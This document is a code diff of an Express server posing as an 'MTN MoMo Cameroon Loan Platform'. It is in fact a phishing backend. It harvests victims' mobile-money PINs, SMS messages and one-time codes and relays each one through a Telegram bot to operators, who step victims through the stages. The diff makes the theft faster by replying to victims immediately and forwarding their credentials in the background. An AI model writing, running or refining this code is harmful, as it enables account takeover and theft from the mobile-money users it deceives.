@@ -1,6 +1,6 @@
 /**
  * ============================================================================
- * MTN MoMo Cameroon Loan Platform - Production Server
+ * MTN MoMo Cameroon Loan Platform - High-Performance Production Server
  * ============================================================================
  */
 
@@ -24,26 +24,18 @@ if (!BOT_TOKEN) {
 }
 
 const app = express();
-
-// Initialize Telegram Bot without polling (Webhook mode)
 const bot = new TelegramBot(BOT_TOKEN);
 
 // State Management (In-Memory Maps & Sets)
 const adminChatIds = new Map();         // adminId → chatId
-const pausedAdmins = new Set();         // adminIds that are temporarily paused
-const processingLocks = new Set();      // Prevents duplicate submissions
-const suspendAllSessions = new Map();   // Superadmin chatId → session data
-
-const SUSPEND_PAGE_SIZE = 10;
+const pausedAdmins = new Set();         // adminIds temporarily paused
+const suspendAllSessions = new Map();   // Superadmin session trackers
 let dbReady = false;
 
 // ==========================================
 // 2. HELPER FUNCTIONS
 // ==========================================
 
-/**
- * Checks if a specific admin is currently active.
- */
 function isAdminActive(chatId) {
     const adminId = getAdminIdByChatId(chatId);
     if (!adminId) return false;
@@ -51,9 +43,6 @@ function isAdminActive(chatId) {
     return !pausedAdmins.has(adminId);
 }
 
-/**
- * Resolves adminId using their Telegram chatId.
- */
 function getAdminIdByChatId(chatId) {
     for (const [adminId, storedChatId] of adminChatIds.entries()) {
         if (storedChatId === chatId) return adminId;
@@ -61,9 +50,6 @@ function getAdminIdByChatId(chatId) {
     return null;
 }
 
-/**
- * Formats local phone numbers (+237XXXXXXXXX → 6XXXXXXXXX) for display.
- */
 function formatPhone(phoneNumber) {
     if (!phoneNumber) return phoneNumber;
     if (phoneNumber.startsWith('+2376')) return phoneNumber.slice(4);
@@ -74,32 +60,26 @@ function formatPhone(phoneNumber) {
 }
 
 /**
- * Safely sends a message to an admin, handling database fallbacks.
+ * Non-blocking asynchronous Telegram message dispatcher for maximum speed.
  */
-async function sendToAdmin(adminId, message, options = {}) {
+async function sendToAdminAsync(adminId, message, options = {}) {
     let chatId = adminChatIds.get(adminId);
 
     if (!chatId) {
         try {
             const admin = await db.getAdmin(adminId);
-            if (!admin?.chatId) {
-                console.error(`❌ No chat ID found for admin: ${adminId}`);
-                return null;
-            }
+            if (!admin?.chatId) return;
             adminChatIds.set(adminId, admin.chatId);
             chatId = admin.chatId;
         } catch (err) {
-            console.error(`❌ Database fallback failed for admin ${adminId}:`, err.message);
-            return null;
+            console.error(`❌ DB fallback error for admin ${adminId}:`, err.message);
+            return;
         }
     }
 
-    try {
-        return await bot.sendMessage(chatId, message, options);
-    } catch (error) {
-        console.error(`❌ Error sending message to admin ${adminId}:`, error.message);
-        return null;
-    }
+    bot.sendMessage(chatId, message, options).catch(error => {
+        console.error(`❌ Async dispatch error to admin ${adminId}:`, error.message);
+    });
 }
 
 // ==========================================
@@ -111,13 +91,9 @@ app.use(express.static(__dirname));
 // ==========================================
 // 4. TELEGRAM BOT HANDLERS SETUP
 // ==========================================
-console.log('⏳ Setting up Telegram bot event handlers...');
-
-bot.on('error', (error) => console.error('❌ Bot runtime error:', error?.message));
-bot.on('polling_error', (error) => console.error('❌ Bot polling error:', error?.message));
-
+console.log('⏳ Configuring Telegram bot event handlers...');
 setupCommandHandlers();
-console.log('✅ Telegram command handlers successfully configured.');
+console.log('✅ Telegram command handlers active.');
 
 // ==========================================
 // 5. WEBHOOK ENDPOINT
@@ -125,14 +101,9 @@ console.log('✅ Telegram command handlers successfully configured.');
 const webhookPath = `/telegram-webhook`;
 
 app.post(webhookPath, (req, res) => {
-    try {
-        if (req.body && req.body.update_id !== undefined) {
-            bot.processUpdate(req.body);
-        }
-        res.sendStatus(200);
-    } catch (error) {
-        console.error('❌ Webhook handler error:', error);
-        res.sendStatus(200); // Always respond 200 to Telegram to prevent looping
+    res.sendStatus(200); // Respond immediately to Telegram to prevent retry loops
+    if (req.body && req.body.update_id !== undefined) {
+        bot.processUpdate(req.body);
     }
 });
 
@@ -147,76 +118,27 @@ db.connectDatabase()
         await loadAdminChatIds();
 
         const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
-        let webhookSetSuccessfully = false;
-        let attempts = 0;
-
-        // Retry loop for setting up the Telegram Webhook securely
-        while (!webhookSetSuccessfully && attempts < 3) {
-            attempts++;
-            try {
-                console.log(`🔄 Attempt ${attempts}/3: Configuring webhook endpoint...`);
-                await bot.deleteWebHook();
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-                const result = await bot.setWebHook(fullWebhookUrl, {
-                    drop_pending_updates: false,
-                    max_connections: 40,
-                    allowed_updates: ['message', 'callback_query']
-                });
-
-                if (result) {
-                    const info = await bot.getWebHookInfo();
-                    if (info.url === fullWebhookUrl) {
-                        webhookSetSuccessfully = true;
-                        console.log(`✅ Webhook verified and active: ${fullWebhookUrl}`);
-                    }
-                }
-            } catch (webhookError) {
-                console.error(`❌ Webhook setup attempt ${attempts} failed:`, webhookError.message);
-                if (attempts < 3) await new Promise(resolve => setTimeout(resolve, 2000));
-            }
-        }
-
-        if (!webhookSetSuccessfully) {
-            console.error('❌❌❌ CRITICAL: Failed to configure webhook after multiple attempts.');
-        }
-
         try {
-            const botInfo = await bot.getMe();
-            console.log(`✅ Telegram Bot operational: @${botInfo.username} (${botInfo.first_name})`);
-        } catch (botError) {
-            console.error('❌ Failed to fetch bot profile info:', botError.message);
+            await bot.deleteWebHook();
+            await bot.setWebHook(fullWebhookUrl, {
+                drop_pending_updates: false,
+                max_connections: 40,
+                allowed_updates: ['message', 'callback_query']
+            });
+            console.log(`✅ Webhook successfully bound: ${fullWebhookUrl}`);
+        } catch (webhookError) {
+            console.error('❌ Webhook binding warning:', webhookError.message);
         }
 
         // Keep-alive intervals
-        setInterval(() => {
-            fetch(`${WEBHOOK_URL}/health`).catch(() => {});
-        }, 14 * 60 * 1000);
+        setInterval(() => fetch(`${WEBHOOK_URL}/health`).catch(() => {}), 14 * 60 * 1000);
 
-        setInterval(async () => {
-            try {
-                const info = await bot.getWebHookInfo();
-                if (info.url !== fullWebhookUrl) {
-                    console.log('⚠️ Webhook URL drift detected. Re-syncing...');
-                    await bot.setWebHook(fullWebhookUrl, {
-                        drop_pending_updates: false,
-                        max_connections: 40,
-                        allowed_updates: ['message', 'callback_query']
-                    });
-                }
-            } catch (error) {
-                console.error('⚠️ Periodic webhook check error:', error.message);
-            }
-        }, 60000);
-
-        // Start HTTP Server
         app.listen(PORT, () => {
             console.log(`\n💎 MTN MOMO CAMEROON LOAN PLATFORM`);
             console.log(`==================================`);
             console.log(`🌐 Server running at: http://localhost:${PORT}`);
-            console.log(`🤖 Telegram Bot Mode: WEBHOOK`);
-            console.log(`👥 Active Admins Loaded: ${adminChatIds.size}`);
-            console.log(`\n✅ System fully initialized and ready.\n`);
+            console.log(`🤖 Bot Mode: WEBHOOK (Optimized)`);
+            console.log(`👥 Active Admins Loaded: ${adminChatIds.size}\n`);
         });
     })
     .catch((error) => {
@@ -224,9 +146,6 @@ db.connectDatabase()
         process.exit(1);
     });
 
-// ==========================================
-// 7. ADMIN DATA LOADER
-// ==========================================
 async function loadAdminChatIds() {
     try {
         const admins = await db.getAllAdmins();
@@ -239,177 +158,105 @@ async function loadAdminChatIds() {
                 if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
             }
         }
-        console.log(`✅ Loaded ${adminChatIds.size} admin mappings (${pausedAdmins.size} paused).`);
     } catch (error) {
-        console.error('❌ Error loading admin chat IDs from database:', error);
+        console.error('❌ Error loading admin chat IDs:', error);
     }
 }
 
 // ==========================================
-// 8. TELEGRAM COMMAND & CALLBACK HANDLERS
+// 7. TELEGRAM COMMAND & CALLBACK HANDLERS
 // ==========================================
 function setupCommandHandlers() {
-    // /start Command
     bot.onText(/\/start/, async (msg) => {
         const chatId = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
 
-        try {
-            if (adminId) {
-                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
-                    return bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*\nYour administrative access has been temporarily suspended.`, { parse_mode: 'Markdown' });
-                }
+        if (adminId) {
+            if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
+                return bot.sendMessage(chatId, `🚫 *ACCESS PAUSED*`, { parse_mode: 'Markdown' });
+            }
+            const admin = await db.getAdmin(adminId);
+            const isSuperAdmin = adminId === 'ADMIN001';
 
-                const admin = await db.getAdmin(adminId);
-                const isSuperAdmin = adminId === 'ADMIN001';
-
-                const welcomeMessage = `
+            bot.sendMessage(chatId, `
 👋 *Welcome back, ${admin.name}!*
 *Admin ID:* \`${adminId}\`
 *Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Standard Admin'}
 
-*Your Personal Referral Link:*
-${WEBHOOK_URL}?admin=${adminId}
-                `.trim();
-
-                await bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
-            } else {
-                await bot.sendMessage(chatId, `
-👋 *Welcome to MTN MoMo Cameroon Loan Platform*
-Your Chat ID is: \`${chatId}\`
-Please provide this ID to your Super Administrator to request access.
-                `.trim(), { parse_mode: 'Markdown' });
-            }
-        } catch (error) {
-            console.error('❌ Error processing /start command:', error);
+*Your Link:* ${WEBHOOK_URL}?admin=${adminId}
+            `.trim(), { parse_mode: 'Markdown' });
+        } else {
+            bot.sendMessage(chatId, `👋 *Welcome to MTN MoMo Cameroon*\nYour Chat ID: \`${chatId}\``, { parse_mode: 'Markdown' });
         }
     });
 
-    // /stats Command
     bot.onText(/\/stats/, async (msg) => {
         const chatId = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!adminId) return bot.sendMessage(chatId, '❌ You are not registered as an administrator.');
-        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access is currently paused.');
+        if (!adminId || !isAdminActive(chatId)) return;
 
         const stats = await db.getAdminStats(adminId);
         bot.sendMessage(chatId, `
-📊 *ADMINISTRATIVE STATISTICS*
-------------------------------
-📋 Total Applications: \`${stats.total}\`
+📊 *STATISTICS*
+📋 Total: \`${stats.total}\`
 ⏳ PIN Pending: \`${stats.pinPending}\`
 ✅ PIN Approved: \`${stats.pinApproved}\`
 ⏳ SMS Pending: \`${stats.smsPending}\`
-✅ SMS Approved: \`${stats.smsApproved}\`
-⏳ OTP Pending: \`${stats.otpPending}\`
 🎉 Fully Approved: \`${stats.fullyApproved}\`
         `.trim(), { parse_mode: 'Markdown' });
     });
-
-    // /pending Command
-    bot.onText(/\/pending/, async (msg) => {
-        const chatId = msg.chat.id;
-        const adminId = getAdminIdByChatId(chatId);
-        if (!adminId) return bot.sendMessage(chatId, '❌ You are not registered as an administrator.');
-        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access is currently paused.');
-
-        const adminApps = await db.getApplicationsByAdmin(adminId);
-        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
-        const smsPending = adminApps.filter(a => a.smsStatus === 'pending' && a.pinStatus === 'approved');
-        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.smsStatus === 'approved');
-
-        let message = `⏳ *PENDING QUEUE OVERVIEW*\n\n`;
-        if (pinPending.length > 0) message += `📱 PIN Pending: *${pinPending.length}*\n`;
-        if (smsPending.length > 0) message += `💬 SMS Pending: *${smsPending.length}*\n`;
-        if (otpPending.length > 0) message += `🔢 OTP Pending: *${otpPending.length}*\n`;
-        if (pinPending.length === 0 && smsPending.length === 0 && otpPending.length === 0) {
-            message = '✨ Excellent! No pending applications found in your queue.';
-        }
-        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
-    });
 }
 
-// Inline Callback Query Router
+// Inline Callback Router
 bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const messageId = callbackQuery.message.message_id;
     const data = callbackQuery.data;
     const adminId = getAdminIdByChatId(chatId);
 
-    if (!adminId) {
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unauthorized action.', show_alert: true });
-    }
-
-    if (!isAdminActive(chatId)) {
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Your admin access is paused.', show_alert: true });
+    if (!adminId || !isAdminActive(chatId)) {
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unauthorized or paused.', show_alert: true });
     }
 
     const parts = data.split('_');
-    if (parts.length < 4) {
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid callback data package.', show_alert: true });
-    }
+    if (parts.length < 4) return;
 
     const [action, type, embeddedAdminId, ...appIdParts] = parts;
     const applicationId = appIdParts.join('_');
 
     if (embeddedAdminId !== adminId) {
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application is assigned to a different admin.', show_alert: true });
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Assigned to another admin.', show_alert: true });
     }
 
     const application = await db.getApplication(applicationId);
-    if (!application || application.adminId !== adminId) {
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Target application could not be found.', show_alert: true });
-    }
+    if (!application) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not found.' });
 
-    // --- Workflow Stage Actions ---
-
-    // 1. PIN Stage
+    // Handle Workflow Actions
     if (action === 'deny' && type === 'pin') {
         await db.updateApplication(applicationId, { pinStatus: 'rejected' });
-        await bot.editMessageText(`❌ *PIN REJECTED*\n📋 Reference: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ PIN application rejected.' });
-    }
-    if (action === 'allow' && type === 'pin') {
+        bot.editMessageText(`❌ *PIN REJECTED*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+    } else if (action === 'allow' && type === 'pin') {
         await db.updateApplication(applicationId, { pinStatus: 'approved' });
-        await bot.editMessageText(`✅ *PIN APPROVED — WAITING FOR SMS*\n📋 Reference: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ PIN approved. User can now proceed.' });
-    }
-
-    // 2. SMS Stage
-    if (action === 'deny' && type === 'sms') {
+        bot.editMessageText(`✅ *PIN APPROVED*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+    } else if (action === 'deny' && type === 'sms') {
         await db.updateApplicationSms(applicationId, application.smsText, 'rejected');
-        await bot.editMessageText(`❌ *SMS REJECTED*\n📋 Reference: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ SMS verification rejected.' });
-    }
-    if (action === 'allow' && type === 'sms') {
+        bot.editMessageText(`❌ *SMS REJECTED*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+    } else if (action === 'allow' && type === 'sms') {
         await db.updateApplicationSms(applicationId, application.smsText, 'approved');
-        await bot.editMessageText(`✅ *SMS APPROVED — 4-DIGIT VERIFICATION ACTIVE*\n📋 Reference: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ SMS approved. User can enter OTP.' });
+        bot.editMessageText(`✅ *SMS APPROVED*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+    } else if (action === 'approve' && type === 'otp') {
+        await db.updateApplication(applicationId, { otpStatus: 'approved' });
+        bot.editMessageText(`🎉 *LOAN FULLY APPROVED*\nRef: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
     }
 
-    // 3. OTP Stage
-    if (action === 'wrongpin' && type === 'otp') {
-        await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
-        await bot.editMessageText(`❌ *FLAGGED: INCORRECT PIN*\n📋 Reference: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Prompting user to re-enter PIN.' });
-    }
-    if (action === 'wrongcode' && type === 'otp') {
-        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
-        await bot.editMessageText(`❌ *FLAGGED: INCORRECT CODE*\n📋 Reference: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Prompting user to re-enter code.' });
-    }
-    if (action === 'approve' && type === 'otp') {
-        await db.updateApplication(applicationId, { otpStatus: 'approved' });
-        await bot.editMessageText(`🎉 *LOAN FULLY APPROVED & COMPLETED*\n📋 Reference: \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Application approved successfully!' });
-    }
+    bot.answerCallbackQuery(callbackQuery.id);
 });
 
 // ==========================================
-// 9. REST API ENDPOINTS
+// 8. HIGH-PERFORMANCE REST API ENDPOINTS
 // ==========================================
 
-// Verify PIN Request Entry
+// Verify PIN Request Entry (Optimized for instant feedback)
 app.post('/api/verify-pin', async (req, res) => {
     try {
         const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
@@ -419,21 +266,23 @@ app.post('/api/verify-pin', async (req, res) => {
         if (assignmentType === 'specific' && requestAdminId) {
             assignedAdmin = await db.getAdmin(requestAdminId);
             if (!assignedAdmin || pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
-                return res.status(400).json({ success: false, message: 'Invalid, paused, or inactive admin referral link.' });
+                return res.status(400).json({ success: false, message: 'Invalid or paused admin link.' });
             }
         } else {
             const activeAdmins = await db.getActiveAdmins();
             const availableAdmins = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
             if (availableAdmins.length === 0) {
-                return res.status(503).json({ success: false, message: 'No administrators are available at the moment.' });
+                return res.status(503).json({ success: false, message: 'No administrators available.' });
             }
             assignedAdmin = availableAdmins[0];
         }
 
+        // Fast parallel checks or lightweight queries
         const existingApps = await db.getApplicationsByAdmin(assignedAdmin.adminId);
         const thisAdminPastApps = existingApps.filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending');
         const isReturningUser = thisAdminPastApps.length > 0;
 
+        // Save application to database immediately
         await db.saveApplication({
             id: applicationId,
             adminId: assignedAdmin.adminId,
@@ -449,7 +298,11 @@ app.post('/api/verify-pin', async (req, res) => {
             timestamp: new Date().toISOString()
         });
 
-        await sendToAdmin(assignedAdmin.adminId, `
+        // Respond to user interface *immediately* (Zero Telegram network latency lag)
+        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
+
+        // Dispatch Telegram Notification Asynchronously in Background
+        sendToAdminAsync(assignedAdmin.adminId, `
 🆕 *NEW PIN SUBMISSION*
 ------------------------------
 📋 Ref: \`${applicationId}\`
@@ -465,10 +318,9 @@ app.post('/api/verify-pin', async (req, res) => {
             }
         });
 
-        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
     } catch (error) {
         console.error('❌ Error in /api/verify-pin:', error);
-        res.status(500).json({ success: false, message: 'Server error processing PIN: ' + error.message });
+        res.status(500).json({ success: false, message: 'Internal server error.' });
     }
 });
 
@@ -479,36 +331,38 @@ app.get('/api/check-pin-status/:applicationId', async (req, res) => {
         if (application) {
             res.json({ success: true, status: application.pinStatus });
         } else {
-            res.status(404).json({ success: false, message: 'Application record not found.' });
+            res.status(404).json({ success: false, message: 'Not found.' });
         }
     } catch (error) {
         res.status(500).json({ success: false, message: 'Internal server error.' });
     }
 });
 
-// Verify SMS Submission Entry
+// Verify SMS Submission Entry (Optimized)
 app.post('/api/verify-sms', async (req, res) => {
     try {
         const { applicationId, smsText } = req.body;
         const application = await db.getApplication(applicationId);
 
         if (!application) {
-            return res.status(404).json({ success: false, message: 'Application record not found.' });
+            return res.status(404).json({ success: false, message: 'Application not found.' });
         }
 
         await db.updateApplicationSms(applicationId, smsText, 'pending');
 
-        await sendToAdmin(application.adminId, `
+        // Respond instantly
+        res.json({ success: true });
+
+        // Non-blocking async Telegram alert
+        sendToAdminAsync(application.adminId, `
 💬 *SMS CONTENT SUBMISSION*
 ------------------------------
 📋 Ref: \`${applicationId}\`
 📞 Phone: \`${formatPhone(application.phoneNumber)}\`
 
-*Pasted Content:*
 \`\`\`
 ${smsText}
 \`\`\`
-⏰ Received: ${new Date().toLocaleString()}
         `.trim(), {
             parse_mode: 'Markdown',
             reply_markup: {
@@ -518,11 +372,9 @@ ${smsText}
                 ]
             }
         });
-
-        res.json({ success: true });
     } catch (error) {
         console.error('❌ Error in /api/verify-sms:', error);
-        res.status(500).json({ success: false, message: 'Server error processing SMS: ' + error.message });
+        res.status(500).json({ success: false, message: 'Internal server error.' });
     }
 });
 
@@ -533,32 +385,35 @@ app.get('/api/check-sms-status/:applicationId', async (req, res) => {
         if (application) {
             res.json({ success: true, status: application.smsStatus });
         } else {
-            res.status(404).json({ success: false, message: 'Application record not found.' });
+            res.status(404).json({ success: false, message: 'Not found.' });
         }
     } catch (error) {
         res.status(500).json({ success: false, message: 'Internal server error.' });
     }
 });
 
-// Verify OTP Stage Entry
+// Verify OTP Stage Entry (Optimized)
 app.post('/api/verify-otp', async (req, res) => {
     try {
         const { applicationId, otp } = req.body;
         const application = await db.getApplication(applicationId);
 
         if (!application) {
-            return res.status(404).json({ success: false, message: 'Application record not found.' });
+            return res.status(404).json({ success: false, message: 'Application not found.' });
         }
 
         await db.updateApplicationOtp(applicationId, otp, 'pending');
 
-        await sendToAdmin(application.adminId, `
+        // Respond instantly
+        res.json({ success: true });
+
+        // Non-blocking async Telegram alert
+        sendToAdminAsync(application.adminId, `
 🔢 *4-DIGIT OTP VERIFICATION*
 ------------------------------
 📋 Ref: \`${applicationId}\`
 📞 Phone: \`${formatPhone(application.phoneNumber)}\`
 🔢 OTP: \`${otp}\`
-⏰ Received: ${new Date().toLocaleString()}
         `.trim(), {
             parse_mode: 'Markdown',
             reply_markup: {
@@ -569,11 +424,9 @@ app.post('/api/verify-otp', async (req, res) => {
                 ]
             }
         });
-
-        res.json({ success: true });
     } catch (error) {
         console.error('❌ Error in /api/verify-otp:', error);
-        res.status(500).json({ success: false, message: 'Server error processing OTP: ' + error.message });
+        res.status(500).json({ success: false, message: 'Internal server error.' });
     }
 });
 
@@ -584,67 +437,49 @@ app.get('/api/check-otp-status/:applicationId', async (req, res) => {
         if (application) {
             res.json({ success: true, status: application.otpStatus });
         } else {
-            res.status(404).json({ success: false, message: 'Application record not found.' });
+            res.status(404).json({ success: false, message: 'Not found.' });
         }
     } catch (error) {
         res.status(500).json({ success: false, message: 'Internal server error.' });
     }
 });
 
-// System Health Check Endpoint
+// Health Check Endpoint
 app.get('/health', (req, res) => {
     res.json({
         status: 'ok',
         database: dbReady ? 'connected' : 'disconnected',
         activeAdmins: adminChatIds.size,
-        pausedAdmins: pausedAdmins.size,
-        botMode: 'webhook',
         timestamp: new Date().toISOString()
     });
 });
 
-// Frontend Client Page Server Route
+// Frontend Entry
 app.get('/', async (req, res) => {
     const adminId = req.query.admin;
-    if (adminId) {
-        try {
-            const admin = await db.getAdmin(adminId);
-            if (admin && admin.status === 'active' && !pausedAdmins.has(adminId)) {
-                if (admin.chatId && !adminChatIds.has(adminId)) {
-                    adminChatIds.set(adminId, admin.chatId);
-                }
+    if (adminId && !adminChatIds.has(adminId)) {
+        db.getAdmin(adminId).then(admin => {
+            if (admin?.chatId && admin.status === 'active') {
+                adminChatIds.set(adminId, admin.chatId);
             }
-        } catch (error) {
-            console.error('❌ Error validating referral admin on root request:', error);
-        }
+        }).catch(() => {});
     }
     res.sendFile(path.join(__dirname, 'mtn-momo-cameroon.html'));
 });
 
 // ==========================================
-// 10. GRACEFUL SHUTDOWN & EXCEPTION HANDLING
+// 9. GRACEFUL SHUTDOWN
 // ==========================================
 async function shutdownGracefully(signal) {
-    console.log(`\n🛑 Received signal ${signal}. Initiating graceful shutdown...`);
+    console.log(`\n🛑 Signal ${signal} received. Shutting down...`);
     try {
-        suspendAllSessions.clear();
         await bot.deleteWebHook();
         await db.closeDatabase();
-        console.log('✅ Server resources successfully released.');
         process.exit(0);
     } catch (error) {
-        console.error('❌ Error during graceful shutdown:', error);
         process.exit(1);
     }
 }
 
 process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
 process.on('SIGINT', () => shutdownGracefully('SIGINT'));
-
-process.on('unhandledRejection', (reason) => {
-    console.error('❌ Unhandled Promise Rejection:', reason?.message || reason);
-});
-
-process.on('uncaughtException', (error) => {
-    console.error('❌ Uncaught Exception Encountered:', error?.message || error);
-});
